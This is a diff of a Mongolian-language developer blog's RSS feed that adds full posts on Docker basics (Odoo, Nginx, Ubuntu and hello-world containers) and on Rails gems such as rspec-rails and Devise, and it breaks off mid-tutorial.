+</span></span><span style="display:flex;"><span>    image: <span style="color:#e6db74">&#39;docker.io/bitnami/odoo:14-debian-10&#39;</span>
+</span></span><span style="display:flex;"><span>    ports:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;80:8069&#39;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;443:8071&#39;</span>
+</span></span><span style="display:flex;"><span>    volumes:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;odoo_data:/bitnami&#39;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;./extra-addons:/bitnami/odoo/addons&#39;</span>
+</span></span><span style="display:flex;"><span>    depends_on:
+</span></span><span style="display:flex;"><span>      - postgresql
+</span></span><span style="display:flex;"><span>volumes:
+</span></span><span style="display:flex;"><span>  postgresql_data:
+</span></span><span style="display:flex;"><span>    driver: local
+</span></span><span style="display:flex;"><span>  odoo_data:
+</span></span><span style="display:flex;"><span>    driver: local
+</span></span></code></pre></div><p><a href="https://github.com/CaDiL/docker-101/tree/main/bitnami-odoo">Бүтэц:</a></p>
+<pre tabindex="0"><code>...
+# tree
+/bitnami-odoo/
+|-- extra-addons
+|-- docker-compose.yml
+...
+</code></pre><h3 id="docker-compose-ажилууллах">Docker-compose ажилууллах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker-compose up -d
+</span></span></code></pre></div><p>Image-үүд татаж дуусан networking хийн done болсон бол:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Status: Downloaded newer image <span style="color:#66d9ef">for</span> bitnami/odoo:14-debian-10
+</span></span><span style="display:flex;"><span>Creating bitnami-odoo_postgresql_1 ... <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>Creating bitnami-odoo_odoo_1       ... <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p><code>http://localhost/web/login</code> хаягаар хандан bitnami -с тодорхойлсон нэвтрэх нэр: <a href="mailto:user@example.com">user@example.com</a> нууц үг: bitnami, Odoo руу нэвтрэн орно. Эсхүл шинээр db тохируулах бол &lsquo;<code>http://localhost/web/database/selector</code> - хаягаар орон тохируулж болно.</p>
+<h3 id="docker-compose-унтраах">Docker-compose унтраах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker-compose down
+</span></span></code></pre></div><h3 id="volume-шалгах">Volume шалгах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker volume ls
+</span></span></code></pre></div><h3 id="volume-устгах">Volume устгах:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker volume rm &lt;volume-name&gt;
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Localhost дээр Nginx ажилууллах</title>
@@ -75,6 +939,20 @@
       <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2020-12-21-nginx-container/</guid>
       <description>Localhost дээр Nginx ажилууллах</description>
+      <content:encoded><![CDATA[<h1 id="localhost-дээр-nginx-ажилууллах">Localhost дээр Nginx ажилууллах</h1>
+<p>Локалхост дээр Nignx вэбсервер асаах</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d -p 80:80 --name webserver nginx
+</span></span></code></pre></div><p>Коммандын ажиллаж буй зарчим:</p>
+<ul>
+<li><a href="https://docs.docker.com/engine/reference/commandline/cli/"><code>docker</code></a> - Докэр ачааллах үндсэн комманд.</li>
+<li><a href="https://docs.docker.com/engine/reference/run/"><code>run</code></a> - Контейнер ажлууллна.</li>
+<li><a href="https://docs.docker.com/engine/reference/run/#detached--d"><code>-d</code></a> - Контейнерыг салангид тѳлѳвтэйгээр ажиллуулна. Процесс (веб-сервер) зогсвол контейнер мѳн зогсоно.</li>
+<li><a href="https://docs.docker.com/engine/reference/commandline/run/#publish-or-expose-port--p---expose"><code>-p 80:80</code></a> - Хостинг портыг <code>80</code> контейнер дэх <code>80</code> порттой [host-port]:[container-port] холбох үед ашиглана.</li>
+<li>[<code>--name</code>] - Контейнерт нэр онооно.</li>
+<li><code>nginx</code> - Локал дээр ийм нэртэй repo байгаа эсэхийг шалгаад байхгүй бол Docker Hub - аас <a href="https://hub.docker.com/_/nginx/"><code>nginx</code></a> image - татаж авна. Tag - ыг тодорхой бичиж ѳгѳѳгүй бол хамгийн сүүлийн хувилбар буюу <code>nginx:latest</code> - татаж авна.</li>
+</ul>
+<p>Дээрх комманд ажиллаж дуусан бол browser-с <code>http://localhost:80/</code> - хандан Nginx -д ажиллаж байгааг шалгаарай.</p>
+]]></content:encoded>
     </item>
     <item>
       <title>Ubuntu контейнер ажилууллах</title>
@@ -82,6 +960,30 @@
       <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2020-12-21-ubuntu-container/</guid>
       <description>Ubuntu контейнер ажилууллах</description>
+      <content:encoded><![CDATA[<h2 id="ubuntu-контейнер-ажилууллах">Ubuntu контейнер ажилууллах</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run ubuntu
+</span></span></code></pre></div><h3 id="ubuntu-контейнер-руу-shell--ээр-хандах">Ubuntu контейнер руу shell -ээр хандах</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -ti &lt;your-container-name&gt; /bin/bash 
+</span></span></code></pre></div><p>Эсвэл:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker exec -ti &lt;your-container-name&gt; bash
+</span></span></code></pre></div><blockquote>
+<p><strong>Note</strong>: shell-с гарахдаа Ctrl + D</p>
+</blockquote>
+<h3 id="ажиллаж-байгаа-контейнер-инспект-хийх-inspecting">Ажиллаж байгаа контейнер инспект хийх (inspecting)</h3>
+<p>Контейнер нэрийг тодорхойлох.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker ps -a
+</span></span></code></pre></div><p>Контейнер нэрийг ашиглан инспект хийх.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker inspect &lt;your-container-name&gt;
+</span></span></code></pre></div><h3 id="ip-хаяг-тодорхойлох">IP хаяг тодорхойлох</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker inspect &lt;your-container-name&gt; | grep IPAddress
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker inspect --format <span style="color:#f92672">{{</span>.NetworkSettings.IPAddress<span style="color:#f92672">}}</span> &lt;your-container-name&gt;
+</span></span></code></pre></div><h3 id="лог-шалгах">Лог шалгах</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker logs &lt;your-container-name&gt;
+</span></span></code></pre></div><h3 id="контейнер-зогсоох">Контейнер зогсоох</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker stop &lt;your-container-name&gt;
+</span></span></code></pre></div><h3 id="ажиллаагүй-байгаа-контейнер-цэвэрлэх-clean-up">Ажиллаагүй байгаа контейнер цэвэрлэх (clean up)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker rm -v <span style="color:#66d9ef">$(</span>docker ps -aq -f states<span style="color:#f92672">=</span>exited<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Докэр контейнр болон Виртуалчлал</title>
@@ -89,6 +991,23 @@
       <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2020-12-16-docker-container/</guid>
       <description>Докэр контейнр болон Виртуалчлал</description>
+      <content:encoded><![CDATA[<h1 id="виртуалчлал">Виртуалчлал</h1>
+<p><strong>Виртуал машин</strong>: Софтвейр контейнр дотор (үйлдлийн систем + апплкэйшнг) салангид бүтэцтэй ажиллуулна. Нэг физик серверт олон вирутал машин (ВМ) ажилуулах боломжтой.
+<a href="https://en.wikipedia.org/wiki/Hypervisor">Гипервизор</a> (Виртуал машин мониторинг ВММ)
+Виртуал машин бүрийн нѳѳцийг тооцоолж динамик хуваарилалт хийнэ.</p>
+<p><strong>Контейнр</strong>: Хѳнгѳн байх бүтэцтэй виртуалчлал (контейнэр) нэг хостинг дотор ажиллах боломж. Үйлдлийн системээс ялгаатай нь кернел байхгүй. Хостинг хийж байгаа машины кернелийг хуваалцаж ашиглана (Илүү хѳнгѳн бүцэтэй болгох гэж тэр). Контейнр хоорондын тусгаарлалт хийхдээ <a href="https://en.wikipedia.org/wiki/Process_isolation">процесс тѳлѳвт тусгаарлалт</a> ашиглана.</p>
+<h2 id="докэр-контейнр">Докэр контейнр</h2>
+<p>Линукс контейнр (LXC) - с үүдэлтэй. LXC нь нэг хостинг дээр олон Линукс систем ажлууллах үйлдийн систем суурт виртуал аргачлал юм. Namespace, cgroup -ээр дамжих замаар LXC ажиллана. Докэр эхэн үедээ сингл-апплкэйшн LXC контейрн болгож LXC өөрчлөлт шинэчлэл хийгдэх болгонд илүү уян хатан,  зѳѳвѳрлѳх боломжтой болсон.</p>
+<figure>
+    <img loading="lazy" src="/images/Docker_Container_001.png"/> 
+</figure>
+
+<p><strong>Docker</strong> нь кодыг нэмэлтүүдийн хамт image дотор байрлуулна. Нээлттэй эх дээрх багаж</p>
+<figure>
+    <img loading="lazy" src="/images/Docker_Container_002.png"/> 
+</figure>
+
+]]></content:encoded>
     </item>
     <item>
       <title>Жишээ контейнер ажилуулах (hello-world)</title>
@@ -96,6 +1015,41 @@
       <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2020-12-17-hello-world-container/</guid>
       <description>Жишээ контейнер ажилуулах (hello-world)</description>
+      <content:encoded><![CDATA[<h1 id="жишээ-контейнер-ажилуулах">Жишээ контейнер ажилуулах</h1>
+<p><a href="https://docs.docker.com/engine/install/">Докэр суулгах</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker run hello-world
+</span></span></code></pre></div><p>Docker run командаар контейнер дуудаж ажиллуулна.</p>
+<p>hello-world нэртэй image-г локалаас хайж үзнэ. Хэрэв ийм нэртэй image олдохгүй бол <a href="https://hub.docker.com">Dockerhub</a>-аас адил нэртэй <a href="https://hub.docker.com/_/hello-world/">image</a>-г хайн ажиллуулна.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Hello from Docker!
+</span></span><span style="display:flex;"><span>This message shows that your installation appears to be working correctly.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To generate this message, Docker took the following steps:
+</span></span><span style="display:flex;"><span> 1. The Docker client contacted the Docker daemon.
+</span></span><span style="display:flex;"><span> 2. The Docker daemon pulled the <span style="color:#e6db74">&#34;hello-world&#34;</span> image from the Docker Hub.
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>amd64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> 3. The Docker daemon created a new container from that image which runs the
+</span></span><span style="display:flex;"><span>    executable that produces the output you are currently reading.
+</span></span><span style="display:flex;"><span> 4. The Docker daemon streamed that output to the Docker client, which sent it
+</span></span><span style="display:flex;"><span>    to your terminal.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To try something more ambitious, you can run an Ubuntu container with:
+</span></span><span style="display:flex;"><span> $ docker run -it ubuntu bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Share images, automate workflows, and more with a free Docker ID:
+</span></span><span style="display:flex;"><span> https://hub.docker.com/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For more examples and ideas, visit:
+</span></span><span style="display:flex;"><span> https://docs.docker.com/get-started/
+</span></span></code></pre></div><h2 id="контейнер-ажиллаж-байгаа-эсэхийг-шалгах">Контейнер ажиллаж байгаа эсэхийг шалгах</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker ps
+</span></span></code></pre></div><blockquote>
+<p><strong>Note</strong>: Үр дүнд ажиллаж байгаа контейнер лист буцаахгүй буюу хоосон утга буцаавал контейнер ажиллаж дуусаад зогссон байна.</p>
+</blockquote>
+<h2 id="сүүлийн-байдлаар-ажиллаж-байсан-контейнер-шалгах">Сүүлийн байдлаар ажиллаж байсан контейнер шалгах</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker ps -l
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CONTAINER ID   IMAGE         COMMAND    CREATED         STATUS                     PORTS     NAMES
+</span></span><span style="display:flex;"><span>562a70b66077   hello-world   <span style="color:#e6db74">&#34;/hello&#34;</span>   <span style="color:#ae81ff">8</span> minutes ago   Exited <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#ae81ff">8</span> minutes ago             zealous_feynman
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Rspec-rails gem</title>
@@ -103,6 +1057,88 @@
       <pubDate>Wed, 13 Apr 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-04-13-rspec-rails-gem/</guid>
       <description>Rspec нь тест хийх зориулалттай framework ба олон талт боломжуудтай юм. </description>
+      <content:encoded><![CDATA[<h3 id="танилцуулга">Танилцуулга</h3>
+<p>Хамгийн хэрэгтэй гэсэн Development - gem - үүдээс эхнээс нь танилцаж явах болно. Мэдээж бид бүхэнд юуны ѳмнѳ rspec-rails gem хэрэгтэй. Rspec нь тест хийх зориулалттай framework ба олон талт боломжуудтай юм.</p>
+<h3 id="dev-gems">Dev Gems</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>group <span style="color:#e6db74">:development</span>, <span style="color:#e6db74">:test</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;better_errors&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;capybara-webkit&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;factory_girl_rails&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;ffaker&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;database_cleaner&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;letter_opener&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;rspec-rails&#39;</span> 
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;pry&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;pry-nav&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;pry-rails&#39;</span>, <span style="color:#e6db74">&#39;~&gt; 0.3.2&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;simple_bdd&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;shoulda-matchers&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;spring&#39;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Дээр байгаа нийт 13 Development, test - gem - үүдийг нэг нэгээр нь дэлгэрэнгүй үзэх болно.
+Энэ удаа бид gem &lsquo;rspec-rails&rsquo; дэлгэрэнгүй авч үзнэ. Rspec - ыг ажиллуулах үед <a href="https://github.com/thoughtbot/capybara-webkit">capybara-webkit</a> суулгахыг шаардана. Capybara-webkit-ыг суулгахын ѳмнѳ Qt libraries суулгасан байх шаардлагатай. <a href="https://github.com/thoughtbot/capybara-webkit/wiki/Installing-Qt-and-compiling-capybara-webkit">Энд</a> дарж суулгах заавартай танилцаарай.</p>
+<h3 id="rspec-rails">rspec-rails</h3>
+<p>rspec-rails нь Rails 3.x 4.x зориулсан testing framework юм.
+Gemfile - ын group :development, :test do - дотор бичиж ѳгнѳ:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>group <span style="color:#e6db74">:development</span>, <span style="color:#e6db74">:test</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;rspec-rails&#39;</span>
+</span></span><span style="display:flex;"><span>   gem <span style="color:#e6db74">&#39;capybara-webkit&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Дараагаар нь терминал дээр:</p>
+<p>{% codeblock %}
+$ bundle install
+{% endcodeblock %}</p>
+<p>Bundle install хийгдэж дууссан бол, rspec - ээ суулгана. Терминал дээр:</p>
+<p>{% codeblock %}
+$ rails generate rspec:install
+{% endcodeblock %}</p>
+<p>/spec/rails_helper.rb замаар орон require ‘rspec/rails’ - ыг нэмнэ:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;rspec/rails&#39;</span>
+</span></span></code></pre></div><h3 id="home-spec">Home Spec</h3>
+<p>/spec - фолдер дотор features - фолдер шинээр үүсгэнэ. Энэ фолдер дотор бид spec-үүдээ бичээд явах юм.</p>
+<p>{% codeblock %}
+$ cd spec
+$ mkdir features
+{% endcodeblock %}</p>
+<p>Шинээр үүсгэсэн features - фолдер дотроо home_spec.rb - үүсгэж ѳгнѳ:</p>
+<p>{% codeblock %}
+$ vi /spec/features/home_spec.rb
+{% endcodeblock %}</p>
+<p>Энэ хичээлийн явцад [Vim](<a href="https://en.wikipedia.org/wiki/Vim_(text_editor)">https://en.wikipedia.org/wiki/Vim_(text_editor)</a> ашиглах ба та ѳѳрийн дурын editor-ыг ашиглах боломжтой.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;rails_helper&#39;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>feature <span style="color:#e6db74">&#34;Home page уруу орох&#34;</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  scenario <span style="color:#e6db74">&#34;Хэрэглэгч, тавтай морилно уу гэсэн текст харах&#34;</span> <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    visit root_path
+</span></span><span style="display:flex;"><span>    expect(page)<span style="color:#f92672">.</span>to have_text(<span style="color:#e6db74">&#34;Тавтай морилно уу CaDiL&#34;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><h3 id="spec---ыг-ажиллуулах">Spec - ыг ажиллуулах</h3>
+<p>Бүх spec - ыг ажлуулах:</p>
+<p>{% codeblock %}
+$ rspec
+{% endcodeblock %}</p>
+<p>Фолдер дотор байгаа spec-үүдыг ажлуулах:</p>
+<p>{% codeblock %}
+$ rspec spec/features
+{% endcodeblock %}</p>
+<p>Нэг spec ажлуулах:</p>
+<p>{% codeblock %}
+$ rspec spec/features/home_spec.rb
+{% endcodeblock %}</p>
+<h3 id="spec-ын-дагуу">Spec-ын дагуу</h3>
+<p>rspec ажиллуулж үзэн гарсан алдааны мэдээллээр алдааг засаж үзье.</p>
+<p>Home controller - ыг index method - той хамт үүсгэх:</p>
+<p>{% codeblock %}
+$ rails g controller Home index
+{% endcodeblock %}</p>
+<p>Home index - ыг үндсэн хуудсаар сонгож ѳгѳхын тулд app/config/routes.rb - уруу орон:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>root <span style="color:#e6db74">&#39;home#index&#39;</span>
+</span></span></code></pre></div><p>бичиж ѳгнѳ.</p>
+<p>Шинээр үүсгэсэн Home index үрүү орон доорх мѳрийг бичиж ѳгнѳ:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;Тавтай морилно уу CaDiL&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Devise gem</title>
@@ -110,6 +1146,37 @@
       <pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-04-12-devise-gem/</guid>
       <description>Devise нь Rails дээр суурилсан уян хатан `authentication` шийдлийн нэг юм.</description>
+      <content:encoded><![CDATA[<h3 id="devise-gem">Devise Gem</h3>
+<p>Devise нь Rails дээр суурилсан уян хатан <code>authentication</code> шийдлийн нэг юм.</p>
+<ul>
+<li>Rack дээр суурилсан</li>
+<li>Rails engine дээр суурилсан бүрэн MVC шийдэл юм</li>
+<li>Нэг цагт олон моделиуд зэрэг хандалт хийх боломжтой</li>
+</ul>
+<h4 id="инфо">Инфо</h4>
+<p>Devise ѳргѳн ашиглагддаг gem болохоор internet-ээс хайхад хүссэн мэдээллээ авах боломжтой. Доорх линкээр орон мэдээлэл авах боломжтой: <a href="https://github.com/plataformatec/devise">Devise</a></p>
+<h4 id="эхлэл">Эхлэл</h4>
+<p>Devise 4.0 нь Rails 4.2 болон 4.2 дээшээ загваруудыг дэмжин ажиллана. Gemfile дотор хуулж ѳгѳх:</p>
+<pre tabindex="0"><code>gem &#39;devise&#39;
+</code></pre><p>Хуулсан бол <code>bundle install</code> командыг ашиглан суулгана:</p>
+<pre tabindex="0"><code>bundle install
+</code></pre><p>Gemfile дотроо хуулан bundle install хийсэн бол <code>generate</code> хийн суулгах хэрэгтэй:</p>
+<pre tabindex="0"><code>rails generate devise:install
+</code></pre><p>Generate хийх явцад тохиргооны хэсэг гарч ирэх ба тэдгээрийг зааврын дагуу суулгах шаардлагатай. Тохиргоог хийж дууссан бол generate ашиглан Devise-д <code>модель</code> үүсгэж ѳгнѳ:</p>
+<pre tabindex="0"><code>rails generate devise MODEL
+</code></pre><p><code>MODEL</code> - ын оронд апплкейшны хэрэглэгчийн классын нэрийг бичиж ѳгнѳ. Уг тохиолдолд <code>User</code> эсвэл <code>Admin</code> байж болно. Модель үүсгэсэн бол <code>rake db:migrate</code> хийж ѳгнѳ</p>
+<pre tabindex="0"><code>rake db:migrate
+</code></pre><h4 id="helper">Helper</h4>
+<p>Devise нь controller болон views дотор <code>helper</code> үүсгэж ѳгсѳн байгаа. Controller хэсэгт user authentication оруулж ѳгѳх бол before_action (тухайн моделийг User гэж үзвэл)</p>
+<pre tabindex="0"><code>before_action :authenticate_user!
+</code></pre><p>Devise model - т User - ээс ѳѳр утга оноож ѳгсѳн бол <code>“_user”</code> оронд <code>“_ѳѳрийн утга”</code>аа онож ѳгѳх зарчмаар явна.</p>
+<p>Хэрэглэгч бүртгүүлсэн болохыг шалгах helper:</p>
+<pre tabindex="0"><code>user_signed_in?
+</code></pre><p>Одоогоор нэвтрэн орсон хэрэглэгч:</p>
+<pre tabindex="0"><code>current_user
+</code></pre><p>Session рүү энэ хүрээллээр нэвтрэх боломжтой:</p>
+<pre tabindex="0"><code>user_session
+</code></pre>]]></content:encoded>
     </item>
     <item>
       <title>Hello, Rails!</title>
@@ -117,6 +1184,137 @@
       <pubDate>Mon, 04 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-04-hello/</guid>
       <description>Энгийн апплкейшн бичих.</description>
+      <content:encoded><![CDATA[<h3 id="mvc">MVC</h3>
+<p>Rails нь MVC framework буюу тогтолцоо юм. Rails нь browser - ѳѳс ирэх хүсэлтүүдийг хүлээн авч controller-т ирсэн хүсэлтүүдийг декод (тайлж унших) хийх бѳгѳѳд уг болж байгаа процессыг <code>action method</code> гэж нэрлэдэг.</p>
+<p>Rails - аас авах нэг сайн тал гэвэл дотоод холболтууд нь цэгцтэй, дэс дараалалтай ер нь хамгийн сайн бүтэцтэй. “Hello World” - энгийн апплкейшн бичихийн тулд Controller, View шинээр үүсгэж кодлоно. Мэдээж энэ хоёрыг холбож ѳгсѳн холбоос, зам (route) хэрэгтэй. Нэг зүйл дутаагаад байна уу даа, гэж бодож байж магадгүй. Model - ыг яагаад бичихгүй юм бэ гэж гайхаж байгаа байх, хариулт нь, бидний одоо бичиж энэхүү апплкейшн нь ямар нэг байдлаар Data ч юм уу ѳгѳгдлийн сантай холбогдохгүй болохоор Model-ыг шууд алгасая. Эхлээд Controller - оос эхэлцгээе.
+Шинээр апплейкшн үүсгэж байсан райлс командыг ашиглан одоогийн бяцхан тѳсѳл дотроо controller үүсгэх юм. rails generate - гэх энэ райлс командыг ашиглах ба цаашид бид <code>rails g</code> гэж товчилж бичиж явна шүү. Controller үүсгэж байгаа rails g - араас script бичиж ѳгѳх байгаа. За, “Say” гэсэн controller үүсгэцгээе.</p>
+<pre><code>demo&gt; rails g controller Say hello goodbye
+create app/controllers/say_controller.rb
+ route  get &quot;say/goodbye&quot;
+ route  get &quot;say/hello&quot;
+invoke  erb
+create    app/views/say
+create    app/views/say/hello.html.erb
+create    app/views/say/goodbye.html.erb
+invoke  test_unit
+create    test/controllers/say_controller_test.rb
+invoke  helper
+create    app/helpers/say_helper.rb
+invoke    test_unit
+create      test/helpers/say_helper_test.rb
+invoke  assets
+invoke    coffee
+create      app/assets/javascripts/say.js.coffee
+invoke    scss
+create      app/assets/stylesheets/say.css.scss
+</code></pre>
+<p>За terminal доошоогоо бас л баахан шинэ файл, directories үүсчихлээ дээ. Удахгүй эдгээр файлууд нь ямар учиртай болохыг зах зухаас нь онгичож үзэцгээнэ. Ямартай ч эхлээд чухлаас нь:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SayController</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ApplicationController</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">goodbye</span>
